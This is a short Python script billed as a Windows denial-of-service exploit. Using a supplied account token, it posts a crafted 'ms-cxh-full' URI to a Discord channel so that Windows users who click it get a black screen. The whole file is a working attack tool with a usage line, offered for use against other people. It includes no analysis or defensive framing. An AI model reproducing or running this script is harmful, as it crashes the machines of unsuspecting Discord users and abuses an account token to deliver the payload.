# Name: Windows Denial of Service
# Description: Send a URI, that if clicked, causes a denial of service (black screen of death) on Windows machines
# Author: checksum (@0daySkid)
# Original founder: 0x41.cf

import requests
import sys

class Exploit:

    def __init__(self, token, channel):
        self.token = token
        self.channel_id = channel
        self.headers = {'Authorization': token}


    def execute(self):
        """ send malicious URI """
        return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<ms-cxh-full://0>'})

    
def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <channel id>')
        sys.exit()

    token = sys.argv[1]
    channel_id = sys.argv[2]

    exploit = Exploit(token, channel_id)

    exploit.execute()


if __name__ == '__main__':
    main()
